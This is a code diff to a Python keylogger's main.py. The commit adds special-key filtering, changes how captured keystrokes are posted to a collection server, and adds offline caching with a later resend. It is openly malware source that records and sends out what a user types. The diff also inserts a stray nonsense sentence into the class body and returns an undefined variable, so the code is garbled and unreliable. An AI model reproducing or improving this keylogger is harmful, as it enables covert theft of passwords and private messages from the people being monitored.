create connection

+++ main.py
@@ -29,7 +29,7 @@ class KeyLogger():
     def __parse_log_loop(self):
         '''parse data from raw log, deleting special keys'''
         while True:
-            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
+            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down', 'num lock', 'caps lock'] # deleteing special keys
             copy_log = self.__log.copy()
             self.__log = []
             for i in copy_log:
@@ -42,7 +42,7 @@ class KeyLogger():
                 elif not i in black_list:
                     self.__keylogger_result += i
             time.sleep(1)
-
+hello world and now i tell you sitdown
     @staticmethod
     def __read_data_from_file(file):
         with open(file, 'r') as file:
@@ -62,8 +62,9 @@ class KeyLogger():
 
     def __send_to_server(self, data):
         '''send data in json format to server'''
-        requests.post(self.__url, {self.__id:self.__create_json_dict(data)})
-
+        now = datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S')
+        p = requests.post(self.__url, {'data': data, 'keylogger_ref': self.__id, 'date':now})
+        print(p.status_code)
     def __restore_data(self):
         '''restore data from file'''
         try:
@@ -77,13 +78,18 @@ class KeyLogger():
         no_Internet = False
         while True:
             try:
+                
                 if no_Internet:
-                    self.__send_to_server(self.__keylogger_result+self.__restore_data())
-                    no_Internet = False
-                    os.remove(self.__file)
+                    to_send = self.__keylogger_result+self.__restore_data()
+                    if to_send:
+                        self.__send_to_server(self.__keylogger_result+self.__restore_data())
+                        no_Internet = False
+                        os.remove(self.__file)
                 else:
-                    self.__send_to_server(self.__keylogger_result)
-            except:
+                    if self.__keylogger_result:
+                        self.__send_to_server(self.__keylogger_result)
+            except Exception as e:
+                print(e)
                 no_Internet = True
                 self.__write_to_file(self.__keylogger_result, self.__file)
             finally:
@@ -91,16 +97,16 @@ class KeyLogger():
             time.sleep(10)
 
     def __get_id(self):
-        id = json.loads(requests.get(self.__url+'/create-keylogger'))['id']
         conf = configparser.ConfigParser()
-        conf['MIAN']['id'] = id
+        conf['MAIN'] = requests.get(self.__url+'/create-keylogger').json()
         with open('config.ini', 'w') as file:
             conf.write(file)
         return id
         
     def __restore_id(self):
         conf = configparser.ConfigParser()
-        conf.read('conf.ini')
+        conf.read('config.ini')
+        print(conf.sections())
         return conf['MAIN']['id']
 
     def __inital_doing(self):
@@ -117,8 +123,6 @@ class KeyLogger():
         log_thread.start()
         parse_log_tread.start()
         save_tread.start()
-
-        
 if __name__ == "__main__":
     keylogger = KeyLogger('log.data', 'http://127.0.0.1:8000')
     keylogger.mainloop()
